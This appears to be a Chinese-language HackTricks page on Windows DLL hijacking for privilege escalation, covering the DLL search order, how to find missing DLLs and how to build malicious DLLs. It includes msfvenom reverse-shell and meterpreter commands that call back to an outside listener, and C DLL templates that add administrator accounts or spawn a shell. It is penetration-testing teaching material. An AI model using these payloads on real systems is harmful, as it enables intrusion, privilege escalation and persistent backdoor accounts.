# Dll 劫持

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 HackTricks 中看到您的**公司广告**或**下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

如果您对**黑客职业**感兴趣并且想要黑入不可黑的系统 - **我们正在招聘！**（_需要流利的波兰语书写和口语_）。

{% embed url="https://www.stmcyber.com/careers" %}

## 定义

首先，让我们先弄清楚定义。从广义上讲，Dll 劫持是**欺骗合法/受信任的应用程序加载任意 DLL**。_DLL 搜索顺序劫持_、_DLL 加载顺序劫持_、_DLL 伪装_、_DLL 注入_ 和 _DLL 侧加载_ 这些术语经常被错误地用来表示相同的意思。

Dll 劫持可以用来**执行**代码、获得**持久性**和**提升权限**。在这三个目标中，**最不可能**找到的是**权限提升**。然而，由于这是权限提升部分的一部分，我将专注于这个选项。另外，请注意，无论目标是什么，dll 劫持的执行方式都是相同的。

### 类型

有多种方法可供选择，成功与否取决于应用程序配置加载其所需 DLL 的方式。可能的方法包括：

1. **DLL 替换**：用恶意 DLL 替换合法 DLL。这可以与 _DLL 代理_ 结合使用，确保原始 DLL 的所有功能保持完整。
2. **DLL 搜索顺序劫持**：应用程序未指定路径的 DLL 将按特定顺序在固定位置进行搜索。通过将恶意 DLL 放在实际 DLL 之前搜索的位置来劫持搜索顺序。这有时包括目标应用程序的工作目录。
3. **幽灵 DLL 劫持**：在合法应用程序尝试加载的缺失/不存在的 DLL 位置放置恶意 DLL。
4. **DLL 重定向**：更改搜索 DLL 的位置，例如通过编辑 `%PATH%` 环境变量，或 `.exe.manifest` / `.exe.local` 文件以包含包含恶意 DLL 的文件夹。
5. **WinSxS DLL 替换**：在目标 DLL 的相关 WinSxS 文件夹中用恶意 DLL 替换合法 DLL。通常被称为 DLL 侧加载。
6. **相对路径 DLL 劫持**：将合法应用程序复制（并可选重命名）到用户可写文件夹，与恶意 DLL 放在一起。这种使用方式与（签名的）二进制代理执行有相似之处。这种方法的一个变体被（有些矛盾地）称为‘_带上你自己的 LOLbin_’，其中合法应用程序与恶意 DLL 一起带来（而不是从受害者机器上的合法位置复制）。

## 寻找缺失的 Dlls

在系统内寻找缺失的 Dlls 最常见的方法是运行来自 sysinternals 的 [procmon]，**设置**以下**两个过滤器**：

![](<../../.gitbook/assets/image (311).png>)

![](<../../.gitbook/assets/image (313).png>)

并只显示**文件系统活动**：

![](<../../.gitbook/assets/image (314).png>)

如果您正在寻找**一般缺失的 dlls**，您可以**让它运行几秒钟**。\
如果您正在寻找**特定可执行文件内的缺失 dll**，您应该设置**另一个过滤器，如 "Process Name" "contains" "\<exec name>"，执行它，并停止捕获事件**。

## 利用缺失的 Dlls

为了提升权限，我们最好的机会是能够**编写一个特权进程将尝试加载的 dll**，在某个**将要被搜索的地方**。因此，我们将能够**在 dll 在原始 dll 所在的文件夹之前被搜索的文件夹中写入** dll（奇怪的情况），或者我们将能够**在 dll 将要被搜索的某个文件夹中写入**，而原始的**dll 不存在于任何文件夹**。

### Dll 搜索顺序

**在** [**Microsoft 文档**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **中，您可以找到特定加载 Dlls 的方式。**

通常，**Windows 应用程序**会使用**预定义的搜索路径来查找 DLL**，并且会按特定顺序检查这些路径。Dll 劫持通常通过将恶意 DLL 放置在这些文件夹中的一个来发生，同时确保在合法 DLL 之前找到该 DLL。通过让应用程序指定它需要的 DLL 的绝对路径可以缓解这个问题。

您可以在下面看到**32 位**系统上的**DLL 搜索顺序**：

1. 应用程序加载的目录。
2. 系统目录。使用 [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 函数获取此目录的路径。（_C:\Windows\System32_）
3. 16 位系统目录。没有函数可以获取此目录的路径，但它会被搜索。（_C:\Windows\System_）
4. Windows 目录。使用 [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 函数获取此目录的路径。
   (_C:\Windows_)
5. 当前目录。
6. 列在 PATH 环境变量中的目录。请注意，这不包括由 **App Paths** 注册表键指定的每个应用程序路径。计算 DLL 搜索路径时不使用 **App Paths** 键。

这是启用 **SafeDllSearchMode** 时的**默认**搜索顺序。当它被禁用时，当前目录升级到第二位。要禁用此功能，请创建 **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** 注册表值并将其设置为 0（默认为启用）。

如果调用 [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 函数并带有 **LOAD\_WITH\_ALTERED\_SEARCH\_PATH**，则搜索从 **LoadLibraryEx** 正在加载的可执行模块的目录开始。

最后，请注意，**可以通过指定绝对路径而不仅仅是名称来加载 dll**。在这种情况下，dll **只会在该路径中被搜索**（如果 dll 有任何依赖，它们将被视为仅通过名称加载）。

还有其他方法可以改变搜索顺序，但我不会在这里解释它们。

#### Windows 文档中 dll 搜索顺序的例外

* 如果内存中已经加载了具有相同模块名称的 **DLL**，系统只检查重定向和清单，然后解析为已加载的 DLL，无论它在哪个目录中。**系统不会搜索 DLL**。
* 如果 DLL 在应用程序运行的 Windows 版本的**已知 DLL 列表**上，系统使用其已知 DLL 的副本（以及任何依赖的已知 DLL）**而不是搜索** DLL。有关当前系统上已知 DLL 的列表，请参阅以下注册表键：**HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**。
* 如果 **DLL 有依赖项**，系统会**搜索**依赖 DLL，就好像它们是仅用其**模块名称**加载的一样。即使第一个 DLL 是通过指定完整路径加载的，这也是真的。

### 提升权限

**先决条件**：

* **找到一个进程**，该进程运行/将以**其他权限**运行（水平/横向移动），并且**缺少 dll**。
* 在任何**dll**将要被**搜索**的**文件夹**中拥有**写权限**（可能是可执行文件目录或系统路径内的某个文件夹）。

是的，先决条件很难找到，因为**默认情况下，找到一个缺少 dll 的特权可执行文件是有点奇怪的**，而且在系统路径文件夹中拥有写权限更是**更奇怪**（默认情况下你不能）。但是，在配置不当的环境中，这是可能的。\
如果你幸运地发现自己满足了要求，你可以查看 [UACME](https://github.com/hfiref0x/UACME) 项目。即使该项目的**主要目标是绕过 UAC**，你也可能会在那里找到一个可以使用的 Dll 劫持的 **PoC**（可能只是更改你有写权限的文件夹路径）。

请注意，您可以通过以下方式**检查您在文件夹中的权限**：
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
检查 **PATH** 中所有文件夹的权限：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
你也可以使用以下方法检查一个可执行文件的导入和一个dll的导出：
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
要了解如何**滥用Dll劫持来提升权限**，并拥有在**系统路径文件夹**中写入权限的完整指南，请查看：

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### 自动化工具

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)会检查你是否有系统PATH中任何文件夹的写权限。\
其他发现此漏洞的有趣自动化工具是**PowerSploit函数**：_Find-ProcessDLLHijack_、_Find-PathDLLHijack_ 和 _Write-HijackDll_。

### 示例

如果你发现了一个可利用的场景，成功利用它最重要的事情之一将是**创建一个至少导出可执行文件将从中导入的所有函数的dll**。无论如何，请注意Dll劫持在[从中等完整性级别提升到高级别 **（绕过UAC）**](../authentication-credentials-uac-and-efs.md#uac)或从[**高完整性到SYSTEM**](./#from-high-integrity-to-system)**时非常方便。** 你可以在这个专注于执行的dll劫持研究中找到一个**如何创建有效dll**的示例：[**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**。**\
此外，在**下一节**中，你可以找到一些**基本的dll代码**，这些代码可能作为**模板**或创建**不需要导出函数的dll**时很有用。

## **创建和编译Dlls**

### **Dll代理**

基本上，**Dll代理**是一种能够在加载时**执行恶意代码**，但也能通过**转发所有调用到真实库**来**暴露**和**工作**，**按预期**运行的Dll。

使用工具**[DLLirant](https://github.com/redteamsocietegenerale/DLLirant)** 或 **[Spartacus](https://github.com/Accenture/Spartacus)**，你实际上可以**指定一个可执行文件并选择你想要代理的库**，并**生成一个代理dll**，或者**指定Dll**并**生成一个代理dll**。

### **Meterpreter**

**获取反向shell (x64)：**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**获取 meterpreter (x86)：**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**创建用户（x86 我没有看到 x64 版本）：**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 自己的

请注意，在多数情况下，你编译的Dll必须**导出多个函数**，这些函数将被受害进程加载，如果这些函数不存在，**二进制文件将无法加载**它们，**漏洞利用将失败**。
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

如果您对**黑客职业**感兴趣，并且想要黑进那些不可黑的系统 - **我们正在招聘！**（_需要流利的波兰语书写和口语_）。

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>从零开始学习AWS黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks上看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
